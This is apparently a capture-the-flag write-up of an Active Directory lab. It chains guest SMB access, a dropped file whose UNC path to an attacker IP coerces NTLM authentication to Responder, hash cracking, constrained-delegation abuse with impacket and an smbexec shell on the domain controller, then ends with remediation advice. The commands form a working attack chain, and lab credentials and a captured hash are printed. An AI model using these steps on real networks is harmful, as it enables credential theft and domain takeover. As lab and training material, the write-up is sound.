## Proxy
Oct 9, 2026 · @Gh0ulH4x
### Objective

```
Use your AD knowledge to exploit a careless service account and own the Domain Controller.
```
- An internal black-box engagement against a small Active Directory environment, VPN access only, no credentials supplied

---
## Machine Info
```bash
IP : 10.49.129.215
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-09T09:26:21+00:00
```
---
## Enumeration
- Network Scan
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-10-09 09:25:25Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ctf.local
| Issuer: commonName=DC01.ctf.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-19T02:27:27
| Not valid after:  2026-11-18T02:27:27
| MD5:     a5ba 7599 e686 083e 1b02 8393 ea32 dc81
| SHA-1:   059b 417e faca 4e2e 5ba0 a4c3 b2c2 52e0 dc7e 2074
| SHA-256: ae97 0c14 065e ff1a 29a0 9543 a9a5 ae2e 8b7f ca54 a854 277e 1c7e c535 dd1a 18af
|_ssl-date: 2026-10-09T09:27:01+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```
- A standard Domain Controller profile — Kerberos, LDAP, SMB and RDP all present.
---
### SMB Enumeration
- An unauthenticated guest session was permitted, and listing shares turned up a non-default, read/write share:
```bash
$ smbmap -H '10.49.129.215' -u 'guest' -p '' -r IT-Shared         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)


Disk                  Permissions     Comment
----                  -----------     -------
ADMIN$                 NO ACCESS       Remote Admin
C$                     NO ACCESS       Default share
IPC$                   READ ONLY       Remote IPC
IT-Shared              READ, WRITE     IT Department Shared Resourc
   ./IT-Shared           IT-Credentials-Backup.txt
                         IT-Onboarding-Checklist.txt
        fr--r--r--       IT-Portal.html

NETLOGON                NO ACCESS       Logon server share 
        SYSVOL          NO ACCESS       Logon server share 
```
- `IT-Shared` being both readable and writable to a guest session was the standout lead.
### User Enumeration
- RID cycling against the guest session enumerated the full domain user list:
```bash
nxc smb '10.49.129.215' -u 'guest' -p '' --rid                    
SMB         10.49.129.215   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
[+] ctf.local\guest: 
498: CTF\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CTF\Administrator (SidTypeUser)
501: CTF\Guest (SidTypeUser)
502: CTF\krbtgt (SidTypeUser)
512: CTF\Domain Admins (SidTypeGroup)
513: CTF\Domain Users (SidTypeGroup)
514: CTF\Domain Guests (SidTypeGroup)
515: CTF\Domain Computers (SidTypeGroup)
516: CTF\Domain Controllers (SidTypeGroup)
517: CTF\Cert Publishers (SidTypeAlias)
518: CTF\Schema Admins (SidTypeGroup)
519: CTF\Enterprise Admins (SidTypeGroup)
520: CTF\Group Policy Creator Owners (SidTypeGroup)
521: CTF\Read-only Domain Controllers (SidTypeGroup)
522: CTF\Cloneable Domain Controllers (SidTypeGroup)
525: CTF\Protected Users (SidTypeGroup)
526: CTF\Key Admins (SidTypeGroup)
527: CTF\Enterprise Key Admins (SidTypeGroup)
553: CTF\RAS and IAS Servers (SidTypeAlias)
571: CTF\Allowed RODC Password Replication Group (SidTypeAlias)
572: CTF\Denied RODC Password Replication Group (SidTypeAlias)
1008: CTF\DC01$ (SidTypeUser)
1109: CTF\DnsAdmins (SidTypeAlias)
1110: CTF\DnsUpdateProxy (SidTypeGroup)
1111: CTF\svc.scanner (SidTypeUser)
1112: CTF\svc.mssql (SidTypeUser)
1113: CTF\helpdesk.bob (SidTypeUser)
1114: CTF\it.admin (SidTypeUser)
```
- Two plausible service accounts (`svc.scanner`, `svc.mssql`) and two human-looking accounts (`helpdesk.bob`, `it.admin`) stood out as targets.
## Initial Foothold: The `IT-Shared` Share
- Pulling every file from the writable share:
```bash
smbclient //10.49.129.215/IT-Shared -U 'ctf.local/guest%'
smb: \> mget *
```
**`IT-Credentials-Backup.txt`**
```
IT Department - Credentials Backup
===================================
Generated: 2019-08-14
Status: ARCHIVED (accounts disabled pending security review)

  helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
  it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]
```
- Both creds confirmed valid but disabled — a dead end for direct logon, but they confirmed the accounts existed and were once real.
**`IT-Onboarding-Checklist.txt`** — the actual lead:
```
Automated Services
------------------
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.

  Database Backup (svc.mssql)
    Handles nightly MSSQL backups. Member of Backup Operators.
    Password rotated quarterly -- do not store locally.
```
- This documented an automated process: `svc.scanner` polls `IT-Shared` every two minutes and inspects dropped files' **icons** via Windows Shell enumeration. Shell-based icon lookups resolve any UNC path referenced as an icon source, which meant a file placed on this guest-writable share could coerce `svc.scanner` into authenticating to a host of our choosing.

```bash
$ nxc smb '10.49.129.215' -u 'helpdesk.bob' -p 'Welcome123'\!'' --shares
SMB         10.49.129.215   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.129.215   445    DC01             [+] ctf.local\helpdesk.bob:Welcome123! (Guest)
SMB         10.49.129.215   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
- User exist but permissions are revoked
## Coercing `svc.scanner`
- A minimal PowerShell file referencing an external UNC path was enough to trigger the icon lookup once `svc.scanner`'s scheduled sweep picked it up:
```bash
nano test.ps1 
Test-Path \\192.168.178.7\icons\icon.ico
```
- Dropped onto the share as the guest session:
```bash
 smbclient //'10.49.129.215'/IT-Shared -U 'ctf.local'/'Guest'%''
Try "help" to get a list of possible commands.
smb: \> put test.ps1
putting file test.ps1 as \test.ps1 (0.4 kB/s) (average 0.4 kB/s)
smb: \>
```
- With Responder listening on the attacking interface, the next scanner pass authenticated back within about a minute:
```bash
$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[SMB] NTLMv2-SSP Client   : 10.49.129.215
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:370af9296a898027:507E48EC02EB5FEF6CF12F601B3A1C8C:01010000000000000048692BB557DD019EDD42F8C2789DAF0000000002000800320042004A004D0001001E00570049004E002D004E00550035004800510046005500360045003400350004003400570049004E002D004E0055003500480051004600550036004500340035002E00320042004A004D002E004C004F00430041004C0003001400320042004A004D002E004C004F00430041004C0005001400320042004A004D002E004C004F00430041004C00070008000048692BB557DD01060004000200000008003000300000000000000001000000002000001D51B9F707A4794879CD3111D13C4DFBAE01FD196BB8E35DB889F8A17BEE39FD0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100370038002E0037000000000000000000
```
## Cracking the Hash
```bash
$ haiti "$(cat hash.txt)"
NetNTLMv2 (vanilla) [HC: 5600] [JtR: netntlmv2]
NetNTLMv2 (NT) [HC: 27100] [JtR: netntlmv2]

┌──(kali㉿kali)-[~]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC.SCANNER::CTF:370af9296a898027:507e48ec02eb5fef6...000000

<Hash> : 1summerlove!
```
**Result:** cracked against `rockyou.txt`.
```
User: svc.scanner
Pass: 1summerlove!
```
- Confirmed over RDP:
```bash
$ nxc rdp '10.49.129.215' -u 'svc.scanner' -p '1summerlove'\!''
RDP         10.49.129.215   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:ctf.local) (nla:False)
RDP         10.49.129.215   3389   DC01             [+] ctf.local\svc.scanner:1summerlove!
```
--- 
## Privilege Escalation: Constrained Delegation
- With a working credential, `BloodHound` was collected to map out attack paths:
```bash
$ bloodhound-python -u 'svc.scanner' -p '1summerlove'\!'' -d 'ctf.local' -ns '10.49.129.215' -c All --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: ctf.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.ctf.local:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.ctf.local
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.ctf.local
INFO: Done in 00M 07S
INFO: Compressing output into 20261009062515_bloodhound.zip
```
- The resulting graph showed one direct, high-value edge:
```bash
SVC.Scanner -> AllowedtoDelegate -> DC01.ctf.local
```
- `AllowedToDelegate` marks a constrained-delegation relationship: `svc.scanner` is trusted to request Kerberos service tickets to DC01 **on behalf of any other user**, without ever knowing that user's password. Combined with S4U2Self/S4U2Proxy, this lets a holder of `svc.scanner`'s credentials impersonate Administrator against a specific service on the DC.
---
## Domain Compromise
- Abusing the delegation edge to obtain a service ticket as Administrator:
```bash
$ impacket-getST 'ctf.local'/'svc.scanner':'1summerlove'\!'' -spn cifs/DC01.ctf.local -impersonate administrator -dc-ip 10.49.129.215
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache

┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```
- Access Using `SMBXEC`
```bash
$ impacket-smbexec -k -no-pass ctf.local/Administrator@DC01.ctf.local -dc-ip 10.49.129.215
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
C:\Windows\system32>dir C:\users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\users\Administrator\Desktop

05/20/2026  02:24 AM    <DIR>          .
05/20/2026  02:24 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/20/2026  02:24 AM                41 flag.txt
               3 File(s)          1,122 bytes
               2 Dir(s)  14,639,325,184 bytes free


C:\Windows\system32>type C:\users\Administrator\Desktop\flag.txt
THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
```
- Full domain compromise achieved — Administrator-equivalent code execution on the Domain Controller via constrained delegation abuse.
## Summary

|Stage|Vector|
|---|---|
|Initial Access|Guest-accessible, writable SMB share (`IT-Shared`) leaking old credentials and operational notes|
|Reconnaissance|Onboarding notes describing `svc.scanner`'s automated icon-enumeration behavior|
|Credential Access|Coerced `svc.scanner` into authenticating to Responder via a dropped file referencing a UNC-path icon, captured and cracked its NetNTLMv2 hash|
|Privilege Escalation|`svc.scanner` held `AllowedToDelegate` (constrained delegation) rights to DC01|
|Domain Compromise|S4U2Self/S4U2Proxy to impersonate Administrator, then `smbexec` over Kerberos for code execution on the DC|

### Remediation Recommendations

1. **Remove guest/null access to `IT-Shared`** and audit every share for anonymous read/write permissions — no share should be guest-writable in a production AD environment.
2. **Delete stale credential and operational-notes files from shares entirely**, even ones marked "archived" or referencing disabled accounts; they still disclose usernames, password patterns, and internal automation behavior.
3. **Do not document automated service behavior (polling intervals, what a service account inspects) on a share reachable by low-privileged or anonymous users** — this is reconnaissance material for coercion attacks.
4. **Harden against SMB/NTLM coercion**: enforce SMB signing domain-wide, disable NTLM where possible in favor of Kerberos-only authentication, and restrict outbound SMB from service accounts to only the hosts they need.
5. **Enforce strong, unique passwords for service accounts** — `svc.scanner`'s password was crackable via `rockyou.txt`, indicating insufficient complexity.
6. **Audit and restrict constrained delegation (`AllowedToDelegate`)** to only the specific accounts and services that require it; a low-privileged service account should never hold a delegation path to a Domain Controller.
7. **Monitor for anomalous S4U2Self/S4U2Proxy ticket requests**, especially those impersonating privileged accounts like Administrator.
8. **Review and remove unused/legacy accounts** (`helpdesk.bob`, `it.admin`) rather than leaving them disabled indefinitely — disabled accounts still leak valid historical password patterns if backups aren't purged.